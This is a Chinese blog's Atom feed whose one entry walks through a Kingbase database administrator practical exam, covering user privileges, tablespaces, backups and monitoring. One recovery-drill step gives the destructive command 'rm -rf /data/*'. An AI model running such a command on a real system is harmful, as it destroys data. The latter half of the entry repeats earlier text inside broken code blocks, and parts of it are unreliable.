<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>小菜逼</title>
  
  <subtitle>web安全小菜逼</subtitle>
  <link href="http://www.xiaocaibi.top/atom.xml" rel="self"/>
  
  <link href="http://www.xiaocaibi.top/"/>
  <updated>2021-12-17T12:11:18.374Z</updated>
  <id>http://www.xiaocaibi.top/</id>
  
  <author>
    <name>林先生</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>数据库</title>
    <link href="http://www.xiaocaibi.top/posts/14ea6df7.html"/>
    <id>http://www.xiaocaibi.top/posts/14ea6df7.html</id>
    <published>2021-11-18T11:28:26.000Z</published>
    <updated>2021-12-17T12:11:18.374Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe width="1100" height="600" src="https://www.bilibili.com/video/BV1DT4y1o73i?from=search&amp;seid=14961145105676104449&amp;spm_id_from=333.337.0.0&amp;bvid=BV1YK411K7Ri&amp;cid=235056114&amp;page=1" scrolling="yes" border="0" frameborder="no" framespacing="0" allowfullscreen="" style="height:800xp;width:100%;border-radius:12px 8px 8px 12px;margin:10px"></iframe><h3 id="数据库管理员实操测试题"><a href="#数据库管理员实操测试题" class="headerlink" title="数据库管理员实操测试题"></a>数据库管理员实操测试题</h3><h3 id="数据库管理员实操测试题-1"><a href="#数据库管理员实操测试题-1" class="headerlink" title="数据库管理员实操测试题"></a>数据库管理员实操测试题</h3><p>考前准备：由老师下发VM16及纯净linux集群环境，做好测试准备。</p><p>一、在系统中安装并优化linux系统参数</p><p>（1）  查看优化前设置</p><p>​    <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118181824816.png"></p><p>（2）  查看脚本优化功能<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118182120225.png"></p><p>（3）  优化后检查执行结果</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118182409771.png"></p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118182520357.png"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118182705040.png"></p><p>二、部署安装Kingbase数据库</p><p>（1）  按实施规范创建目录，设置目录的属主、属组、权限并验证</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118184111379.png"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118184546492.png"></p><p>（2）  上传相关安装包，授权文件等，设置授权文件的属主和权限并验证</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118191319485.png"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118191844451.png"></p><p>（3）  安装kingbase数据库，将 KES 服务注册为 linux 系统服务</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118192405033.png"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119091937077.png"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119101119546.png"></p><p>（4）  查看并验证数据库是否安装成功，并能正常连接</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119101238823.png"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119101502107.png"></p><p>（5）  配置用户的环境变量，优化数据库脚本</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119102334962.png"></p><p>三、数据库参数配置</p><p>（1）  使用自动化工具优化内存、检查点、并行度</p><p>（2）  用命令配置数据库参数shared_buffers为600M、连接数设置成200个普通帐号，白名单为192.168.40.0/24，192.168.20.0/24</p><p>四、数据库管理</p><p>（1）  新建数据库 db01</p> <pre class="line-numbers language-none"><code class="language-none">create database db01;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144157605.png"></p><p>（2）  查看 db01 数据库的信息</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144246084.png"></p><p>（3）  创建开发者用户 user01 并授予用户 user01连接数据库 db01的权限</p> <pre class="line-numbers language-none"><code class="language-none">test=# create user user01 password 'user01';test=# grant CONNECT ON DATABASE db01 TO user01;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144356952.png"></p><p>（4）  授予用户 user01拥有 db01库中 public模式 all权限</p> <pre class="line-numbers language-none"><code class="language-none">grant ALL ON SCHEMA PUBLIC TO user01 ;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144611480.png"></p><p>（5）  user01 用户登录 db01库后在 public模式中创建表 t01</p><pre class="line-numbers language-none"><code class="language-none">create table PUBLIC.t01(id int );<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144807077.png"></p><p>（6）  查看上述操作的 SQL代码</p><p>（7）  创建普通用户 user02 并授予用户 user02 连接数据库 db01的权限</p> <pre class="line-numbers language-none"><code class="language-none">db01=# create user user02 password 'user02';db01=# grant CONNECT ON DATABASE db01  TO  user02;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118145037688.png"></p><p>（8）  授予对 user01用户的 t01 表拥有 select和 insert、update、delete权限</p> <pre class="line-numbers language-none"><code class="language-none">db01=# grant SELECT ON PUBLIC.t01 TO user01;db01=# grant INSERT ON PUBLIC.t01 TO user01;db01=# grant UPDATE ON PUBLIC.t01 TO user01;db01=# grant DELETE on PUBLIC.t01 to user01;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118145411938.png"></p><p>（9）  验证 user02 对 t01 表的操作权限（表执行查询、插入、修改、删除操作，无权删除 t01 表）</p><pre class="line-numbers language-none"><code class="language-none">db01=&gt; select * from PUBLIC.t01 ;错误:  对关系 t01 权限不够db01=&gt; insert into PUBLIC.t01 values (1);错误:  对关系 t01 权限不够db01=&gt; drop table PUBLIC.t01 ;错误:  必须是关系 t01 的属主<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118145858876.png"></p><p>五、创建表入录入数据</p><p>（1）  在 db01 库 public 模式下创建表 t02，并插入数据（使用SQL语句）</p><p>（2）  编写 SQL语句查看表 t02的数据</p><p>（3）  单表综合查询：查询人员表30及以上部门的平均工资，只显示出部门平均工资大于8000记录</p><p>（4）  多表关联查询：查询人员工号、姓名、部门名称，只显示5条记录</p><p>（5）  嵌套子查询：查询跟 141 号员工同职位，同时工资比 138 号员工高的员工信息</p><p>（6）  关联子查询：查询员工工资大于自己部门平均工资的所有员工信息</p><p>（7）将表 t02备份为 sql、csv、binary(二进制)格式，根据提示进行适当的配置</p><p>（8）查看导出文件</p><p>六、KSQL对象管理</p><p>（1）  使用system用户连接IP地址为192.168.40.111，端口54321的对象</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118150320850.png"></p><p>（2）  导入“MYSQL初始化脚本5.5.txt”，查看库内数据表</p><p>库内有两个表：这两表用于下面的查询。</p><p>1.scott.dept</p><p>​                               </p><p>2.sctott.emp</p><p>（3）  查看表 scott.dept（sql命令）</p><p>（4）  导出表数据库到 csv 文件</p><p>七、切换用户登录</p><p>（1）  查看连接<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160016825.png"></p><p>（2）  创建用户kca，并登录kca（密码自定义）</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160107898.png"></p><p>（3）  切换用户kca为system用户意见</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160219201.png"></p><p>（4）  创建数据库db1并连接</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160254717.png"></p><p>（5）  切换到数据库samples</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160326517.png"></p><p>八、用户与角色授权</p><p>（1）  创建用户u1</p><p>（2）  创建角色r1</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118160442649.png"></p><p>（3）  对用户u1和角色r1，授权为可读写，可执行</p><p>九、表的模式和对象管理</p><p>（1）  创建测试表table8(id int)</p><p>（2）  创建用户user8 ，密码：KES8</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119103542701.png"></p><p>（3）  授予user8访问库的权限为c/stystem</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119103649190.png"></p><p>（4）  授予user8访问模式的权限为U/stystem</p><pre><code> ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119104007370.png)</code></pre><p>（5）  授予user8访问表的权限r/SYSTEM</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119104156834.png"></p><p>（6）  修改用户口令有效期，查看用户口令有效期</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119105521190.png"><br> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119105458515.png"></p><p>（7）  删除user8表级权限依赖，模式级权限依赖，库级权限依赖</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119105907811.png"></p><p>（8）  撤消user8库级、模式级、对象级授权</p><pre class="line-numbers language-none"><code class="language-none">revoke CONNECT ON DATABASE TEST FROMrevoke USAGE ON SCHEMA PUBLIC FROM user8;revoke SELECT ON PUBLIC.table8 FROM user8;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119110136806.png"></p><p>（9）  删除user8用户是否成功</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119110249325.png"></p><p>十、数据库模板</p><p>（1）用管理员 system 连接数据库 TEST</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105631515.png"></p><p>（3）  创建用户 user01</p> <pre class="line-numbers language-none"><code class="language-none">create user user01 password 'kingbase';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118104704043.png"></p><p>（4）  创建数据库 db01，属主为 user01、编码为 UTF8、参照模板 template0、连接数为 10</p> <pre class="line-numbers language-none"><code class="language-none">create database db01 owner user01 ENCODING 'utf8' TEMPLATE template0 CONNECTION LIMIT 10;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118104901865.png"></p><p>（5）  检查数据库的定义信息</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105022065.png"></p><p>（6）  修改数据库 db01 属主修改为 system</p> <pre class="line-numbers language-none"><code class="language-none">alter database db01 owner to SYSTEM ;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105106730.png"></p><p>（7）  修改数据库 db01 名称为 db10</p> <pre class="line-numbers language-none"><code class="language-none">alter database db01 rename to db10;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105155648.png"></p><p>（8）  删除数据库 db10，提示无法删除当前使用的数据库</p><pre class="line-numbers language-none"><code class="language-none">drop database db10 ;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105341261.png"></p><p>（9）  切换到数据库 TEST</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105435329.png"></p><p>（10）  删除数据库 db10，提示删除完成</p> <pre class="line-numbers language-none"><code class="language-none">drop database db10 ;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118105510110.png"></p><p>十一、表空间的增删改查</p><p>（1）  用管理员 system 连接数据库 test</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118150654326.png"></p><p>（2）  使用元命令查看表空间信息，使用数据字典查看表空间信息，查看数据库的默认表空间信息</p> <pre class="line-numbers language-none"><code class="language-none">\db+select oid,spcname from sys_tablespace;\l+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119094244437.png"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119094355382.png"></p><p>（3）  规划表空间对应的文件系统目录，切换到操作系统管理员 root，在根目录下新建目录 dir01，设定目录 dir01 的属主、属组、权限，检查目录 dir01 的定义信息<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118151558151.png"></p><p>（4）  新建表空间 tbs01，由管理员 system 连接数据库 test，新建表空间 tbs01，关联目录/dir01，表空间属主默认，查看表空间 tbs01 的信息<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118151850349.png"></p><p>（5）  修改表空间 tbs01 的属主和名称，管理员 system 登录数据库 test 并创建用户 user01，修改表空间 tbs10 的属主为 user01，修改表空间 tbs01 的名称为 tbs10</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118152106841.png"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118152157749.png"></p><p>（6）  修改数据库 samples 的默认表空间为 tbs01，由管理员 system 连接数据库 test，修改数据库 samples 默认表空间为 tbs10</p><pre class="line-numbers language-none"><code class="language-none">alter database SAMPLES set tablespace tbs10;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118152504956.png"></p><p>（7）  移动表到新的表空间，由管理员 system 连接数据库 test，查看现有表空间，在表空间 sys_defualt 中创建表 t01 并插入 1 行数据，移动表 t01 到表空间 tbs10 中</p> <pre class="line-numbers language-none"><code class="language-none">\db+test=# create table t01(id int) tablespace SYS_DEFAULT ;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093021134.png"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093219668.png"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093327756.png"></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093429511.png"></p><p>（8）  检查表空间修改结果，查看 samples 数据库当前的默认表空间，查看 test 数据库中 t01 表当前所在的表空间，查看新表空间的名称、属主等信息</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119093800486.png"></p><p>十二、系统物理备份</p><p> （1）开启归档模式，进行快速部署，配置</p><p>（2）在数据表里创建新表a1(int id)，使用generate_series函数插入10000条数据，数据内容为1-10000</p><p>（3）用命令手动完成一次增量备份</p><p>（4）在数据表里创建新表b1(int id)，使用generate_series函数插入10000条数据，数据内容为1-10000</p><p>（5）用命令手动完成一次全备份</p><p>（6）用命令rm-rf /data/*删除数据库，然后做数据库完全恢复。</p><p>十三、数据库简单运维</p><p>（1）  查看 KES 版本信息<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118165956929.png"></p><p>（2）  查看 license 有效期</p><pre class="line-numbers language-none"><code class="language-none">select get_license_validdays();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118174602254.png"></p><p>（3）  查看数据库实例启动时间</p><pre class="line-numbers language-none"><code class="language-none">select sys_postmaster_start_time();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118174823902.png"></p><p>（4）  查看 KES 无故障运行时长</p> <pre class="line-numbers language-none"><code class="language-none">test=# select date_trunc('second',current_timestamp -test(# sys_postmaster_start_time()) as uptime;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118175144920.png"></p><p>（5）  查看数据库列表</p> <pre class="line-numbers language-none"><code class="language-none">\l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118175501188.png"></p><p>（6）  统计当前数据库占用的磁盘空间</p> <pre class="line-numbers language-none"><code class="language-none">select sys_database_size(current_database())/1024/1024||'mb''mb';<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118175655666.png"></p><p>（7）  统计所有数据库占用的磁盘空间总量</p> <pre class="line-numbers language-none"><code class="language-none"> ```（8）  统计表的空间占用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre> <pre class="line-numbers language-none"><code class="language-none">（9）  统计表和与表关联的索引占用空间总量<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre> <pre class="line-numbers language-none"><code class="language-none">（10）  查看耗时较长的 SQL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre> <pre class="line-numbers language-none"><code class="language-none">（11）  采集连接数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre> <pre class="line-numbers language-none"><code class="language-none">十四、系统情况检查（1）  检查系统CPU情况 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118180216780.png)（2）  检查内存情况 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118180104291.png)（3）  磁盘资源消耗情况 （4）  SQL执行时间等 ### 数据库管理员实操测试题考前准备：由老师下发VM16及纯净linux集群环境，做好测试准备。一、在系统中安装并优化linux系统参数（1）  查看优化前设置​    ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118181824816.png)（2）  查看脚本优化功能![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118182120225.png)（3）  优化后检查执行结果 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118182409771.png) ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118182520357.png)![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118182705040.png)二、部署安装Kingbase数据库（1）  按实施规范创建目录，设置目录的属主、属组、权限并验证 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118184111379.png)![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118184546492.png)（2）  上传相关安装包，授权文件等，设置授权文件的属主和权限并验证 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118191319485.png)![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118191844451.png)（3）  安装kingbase数据库，将 KES 服务注册为 linux 系统服务 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118192405033.png)![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119091937077.png)![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119101119546.png)（4）  查看并验证数据库是否安装成功，并能正常连接 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119101238823.png)![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119101502107.png)（5）  配置用户的环境变量，优化数据库脚本 ![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211119102334962.png)三、数据库参数配置（1）  使用自动化工具优化内存、检查点、并行度 （2）  用命令配置数据库参数shared_buffers为600M、连接数设置成200个普通帐号，白名单为192.168.40.0/24，192.168.20.0/24  四、数据库管理（1）  新建数据库 db01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> create database db01;<br> </p><pre class="line-numbers language-none"><code class="language-none">![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144157605.png)（2）  查看 db01 数据库的信息![](https://cdn.jsdelivr.net/gh/linbolg/web/web/image-20211118144246084.png)（3）  创建开发者用户 user01 并授予用户 user01连接数据库 db01的权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br> test=# create user user01 password ‘user01’;<br> 